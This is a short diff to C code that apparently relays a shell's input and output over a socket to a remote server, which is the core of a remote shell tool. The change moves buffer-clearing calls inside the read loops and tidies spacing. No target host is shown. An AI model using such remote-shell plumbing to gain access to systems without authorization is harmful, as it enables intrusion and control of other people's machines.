@@ -13,10 +13,11 @@ void *
 shell_stdin_from_server(void *args)
 {
     char store[FD_CHUNK_SIZE];
-    memset(store, 0x00, FD_CHUNK_SIZE);
 
     while (1)
     {
+        memset(store, 0x00, FD_CHUNK_SIZE);
+
         fd_read(sock, store);
 
         fd_write(shell.stdin, store);
@@ -27,10 +28,11 @@ void *
 shell_stdout_to_server(void *args)
 {
     char store[FD_CHUNK_SIZE];
-    memset(store, 0x00, FD_CHUNK_SIZE);
 
     while (1)
     {
+        memset(store, 0x00, FD_CHUNK_SIZE);
+        
         fd_read(shell.stdout, store);
 
         fd_write(sock, store);
@@ -44,14 +46,14 @@ use_shell()
     puts("Done opening the shell");
 
     pthread_t thread_recv;
-    if(pthread_create(&thread_recv, NULL, shell_stdin_from_server, NULL) != 0)
+    if (pthread_create(&thread_recv, NULL, shell_stdin_from_server, NULL) != 0)
     {
         puts("Failed to create receiver thread.");
         return;
     }
 
     pthread_t thread_push;
-    if(pthread_create(&thread_push, NULL, shell_stdout_to_server, NULL) != 0)
+    if (pthread_create(&thread_push, NULL, shell_stdout_to_server, NULL) != 0)
     {
         puts("Failed to create pusher thread.");
         return;
